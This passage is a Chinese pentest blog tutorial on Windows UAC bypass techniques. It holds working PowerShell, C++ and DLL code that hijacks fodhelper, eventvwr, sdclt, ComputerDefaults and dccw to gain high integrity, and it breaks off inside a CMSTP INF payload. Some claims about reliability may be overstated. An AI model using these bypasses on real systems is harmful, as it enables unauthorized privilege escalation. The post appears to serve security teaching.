@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一、UAC 概述用户账户控制（User Account Control，UAC）是 Windows 从 Vista 开始引入的核心安全机制。它将管理员权限请求隔离，要求用户通过弹窗确认提权。UAC 将用户划分为标准用户和管理员批准模式（AAM），日常操作默认运行在标准上下文中。 UAC 定义了四个完整性级别（Integrity Level）：    级别 值 说明 典型进程    System 0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权：UAC绕过技巧">
+<meta property="og:url" content="https://congliang.github.io/Windows-privesc-UAC-bypass/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="一、UAC 概述用户账户控制（User Account Control，UAC）是 Windows 从 Vista 开始引入的核心安全机制。它将管理员权限请求隔离，要求用户通过弹窗确认提权。UAC 将用户划分为标准用户和管理员批准模式（AAM），日常操作默认运行在标准上下文中。 UAC 定义了四个完整性级别（Integrity Level）：    级别 值 说明 典型进程    System 0">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:46.015Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Windows-privesc-UAC-bypass/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Windows-privesc-UAC-bypass/","path":"Windows-privesc-UAC-bypass/","title":"Windows提权：UAC绕过技巧"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Windows提权：UAC绕过技巧 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81UAC-%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">一、UAC 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81UAC-%E9%80%9A%E7%9F%A5%E7%BA%A7%E5%88%AB%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8D%87%E6%9C%BA%E5%88%B6"><span class="nav-number">2.</span> <span class="nav-text">二、UAC 通知级别与自动提升机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">三、注册表劫持绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-fodhelper-exe"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 fodhelper.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-eventvwr-exe"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 eventvwr.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-sdclt-exe"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 sdclt.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-ComputerDefaults-exe"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 ComputerDefaults.exe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81DLL-%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87-UAC"><span class="nav-number">4.</span> <span class="nav-text">四、DLL 劫持绕过 UAC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-DLL-%E6%90%9C%E7%B4%A2%E9%A1%BA%E5%BA%8F"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 DLL 搜索顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%AE%9E%E6%88%98%EF%BC%9ADccw-dll-%E5%8A%AB%E6%8C%81"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 实战：Dccw.dll 劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81CMSTP-WSReset-%E6%96%B9%E6%B3%95"><span class="nav-number">5.</span> <span class="nav-text">五、CMSTP &#x2F; WSReset 方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-CMSTP-exe"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 CMSTP.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-WSReset-exe"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 WSReset.exe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81UACME-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">六、UACME 工具使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81UAC-%E7%BB%95%E8%BF%87%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">7.</span> <span class="nav-text">七、UAC 绕过流程图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">8.</span> <span class="nav-text">八、检测与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%EF%BC%9ASysmon-%E8%A7%84%E5%88%99"><span class="nav-number">8.1.</span> <span class="nav-text">检测：Sysmon 规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">8.2.</span> <span class="nav-text">防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">9.</span> <span class="nav-text">九、免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">十、总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-UAC-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Windows提权：UAC绕过技巧 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows提权：UAC绕过技巧
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-15T08:00:00+08:00">2025-01-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一、UAC-概述"><a href="#一、UAC-概述" class="headerlink" title="一、UAC 概述"></a>一、UAC 概述</h2><p>用户账户控制（User Account Control，UAC）是 Windows 从 Vista 开始引入的核心安全机制。它将管理员权限请求隔离，要求用户通过弹窗确认提权。UAC 将用户划分为标准用户和管理员批准模式（AAM），日常操作默认运行在标准上下文中。</p>
+<p>UAC 定义了四个完整性级别（Integrity Level）：</p>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>值</th>
+<th>说明</th>
+<th>典型进程</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>System</td>
+<td>0x4000</td>
+<td>系统服务最高权限</td>
+<td>services.exe, lsass.exe</td>
+</tr>
+<tr>
+<td>High</td>
+<td>0x3000</td>
+<td>管理员完整权限</td>
+<td>mmc.exe (提权后)</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>0x2000</td>
+<td>标准用户默认级别</td>
+<td>explorer.exe, cmd.exe (普通)</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>0x1000</td>
+<td>沙箱限制环境</td>
+<td>IE Protected Mode</td>
+</tr>
+</tbody></table>
+<p>攻击者获得 Medium IL Shell 后需要绕过 UAC 提权到 High 级别才能执行管理操作。</p>
+<h2 id="二、UAC-通知级别与自动提升机制"><a href="#二、UAC-通知级别与自动提升机制" class="headerlink" title="二、UAC 通知级别与自动提升机制"></a>二、UAC 通知级别与自动提升机制</h2><p>Windows UAC 的四档通知级别：</p>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>名称</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>始终通知</td>
+<td>任何系统更改都弹窗</td>
+</tr>
+<tr>
+<td>2</td>
+<td>默认</td>
+<td>程序修改系统时弹窗，桌面设置不弹窗</td>
+</tr>
+<tr>
+<td>3</td>
+<td>不降低亮度</td>
+<td>同级别2，但不切换安全桌面</td>
+</tr>
+<tr>
+<td>4</td>
+<td>从不通知</td>
+<td>完全关闭 UAC</td>
+</tr>
+</tbody></table>
+<p>默认级别下，Windows 有一组微软签名的白名单二进制，满足以下条件即可<strong>静默自动提升</strong>——不弹窗直接获得 High IL：</p>
+<ul>
+<li>位于 <code>%SystemRoot%\System32</code> 等受保护目录</li>
+<li>经 Microsoft 数字签名</li>
+<li>内嵌清单中标记 <code>autoElevate=&quot;true&quot;</code></li>
+</ul>
+<p>使用 sigcheck 验证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck.exe -m C:\Windows\System32\fodhelper.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、注册表劫持绕过"><a href="#三、注册表劫持绕过" class="headerlink" title="三、注册表劫持绕过"></a>三、注册表劫持绕过</h2><h3 id="3-1-fodhelper-exe"><a href="#3-1-fodhelper-exe" class="headerlink" title="3.1 fodhelper.exe"></a>3.1 fodhelper.exe</h3><p><code>fodhelper.exe</code>（Features On Demand Helper）是自动提升程序，启动时查询以下注册表路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\ms-settings\shell\open\command</span><br></pre></td></tr></table></figure>
+
+<p>默认该路径不存在。攻击者创建此路径并写入恶意命令即可劫持执行流。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入注册表</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\ms-settings\shell\open\command&quot;</span> <span class="literal">-Force</span> | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\ms-settings\shell\open\command&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;(Default)&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\ms-settings\shell\open\command&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;DelegateExecute&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;&quot;</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发提权</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;C:\Windows\System32\fodhelper.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\ms-settings&quot;</span> <span class="literal">-Recurse</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
+
+<p>C++ 实现简化版：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetRegKey</span><span class="params">(LPCWSTR cmd)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER,</span><br><span class="line">        <span class="string">L&quot;Software\\Classes\\ms-settings\\shell\\open\\command&quot;</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>, REG_OPTION_NON_VOLATILE, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (BYTE*)cmd,</span><br><span class="line">        (<span class="built_in">lstrlen</span>(cmd)<span class="number">+1</span>)*<span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">    <span class="built_in">RegSetValueEx</span>(hKey, <span class="string">L&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ,</span><br><span class="line">        (BYTE*)<span class="string">L&quot;&quot;</span>, <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">SetRegKey</span>(<span class="string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>);</span><br><span class="line">    <span class="built_in">ShellExecute</span>(<span class="literal">NULL</span>, <span class="string">L&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\Windows\\System32\\fodhelper.exe&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_HIDE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-eventvwr-exe"><a href="#3-2-eventvwr-exe" class="headerlink" title="3.2 eventvwr.exe"></a>3.2 eventvwr.exe</h3><p>事件查看器同样是自动提升程序，启动时查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\mscfile\shell\open\command</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\mscfile\shell\open\command&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\mscfile\shell\open\command&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;(Default)&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;C:\Windows\System32\eventvwr.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：Windows 10 1607+ 已部分修补此方法，有效性取决于补丁级别。</p>
+</blockquote>
+<h3 id="3-3-sdclt-exe"><a href="#3-3-sdclt-exe" class="headerlink" title="3.3 sdclt.exe"></a>3.3 sdclt.exe</h3><p><code>sdclt.exe</code>（备份和还原中心）利用 control.exe 路径劫持：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;(Default)&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Users\Public\payload.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;C:\Windows\System32\sdclt.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-ComputerDefaults-exe"><a href="#3-4-ComputerDefaults-exe" class="headerlink" title="3.4 ComputerDefaults.exe"></a>3.4 ComputerDefaults.exe</h3><p>与 fodhelper 共用相同注册表路径，使用不同启动程序，在 Win10&#x2F;Win11 上始终可用：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;C:\Windows\System32\ComputerDefaults.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="四、DLL-劫持绕过-UAC"><a href="#四、DLL-劫持绕过-UAC" class="headerlink" title="四、DLL 劫持绕过 UAC"></a>四、DLL 劫持绕过 UAC</h2><h3 id="4-1-DLL-搜索顺序"><a href="#4-1-DLL-搜索顺序" class="headerlink" title="4.1 DLL 搜索顺序"></a>4.1 DLL 搜索顺序</h3><p>Windows 默认搜索顺序（SafeDllSearchMode 启用）：</p>
+<ol>
+<li>应用程序所在目录</li>
+<li><code>C:\Windows\System32</code></li>
+<li><code>C:\Windows\System</code></li>
+<li><code>C:\Windows</code></li>
+<li>当前工作目录</li>
+<li><code>%PATH%</code> 目录</li>
+</ol>
+<h3 id="4-2-实战：Dccw-dll-劫持"><a href="#4-2-实战：Dccw-dll-劫持" class="headerlink" title="4.2 实战：Dccw.dll 劫持"></a>4.2 实战：Dccw.dll 劫持</h3><p><code>dccw.exe</code>（显示颜色校准）加载 <code>Dccw.dll</code>，将特制 DLL 放在当前目录即可劫持：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil_dccw.cpp → 编译为 Dccw.dll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE h, DWORD reason, LPVOID lp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        <span class="built_in">DisableThreadLibraryCalls</span>(h);</span><br><span class="line">        <span class="built_in">ShellExecute</span>(<span class="literal">NULL</span>, <span class="string">L&quot;open&quot;</span>, <span class="string">L&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_SHOW);</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> .\Dccw.dll C:\Users\Public\</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Public</span><br><span class="line">C:\Windows\System32\dccw.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、CMSTP-WSReset-方法"><a href="#五、CMSTP-WSReset-方法" class="headerlink" title="五、CMSTP &#x2F; WSReset 方法"></a>五、CMSTP &#x2F; WSReset 方法</h2><h3 id="5-1-CMSTP-exe"><a href="#5-1-CMSTP-exe" class="headerlink" title="5.1 CMSTP.exe"></a>5.1 CMSTP.exe</h3><p><code>CMSTP.exe</code>（Connection Manager Profile Installer）可加载 INF 文件执行命令（T1218.003 技术）：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; uac_bypass.inf</span></span><br><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"><span class="attr">AdvancedINF</span>=<span class="number">2.5</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DefaultInstall]</span></span><br><span class="line"><span class="attr">CustomDestination</span>=CustInstDestSectionAllUsers</span><br><span class="line"><span class="attr">RunPreSetupCommands</span>=RunPreSetupCommandsSection</span><br><span class="line"></span><br><span class="line"><span 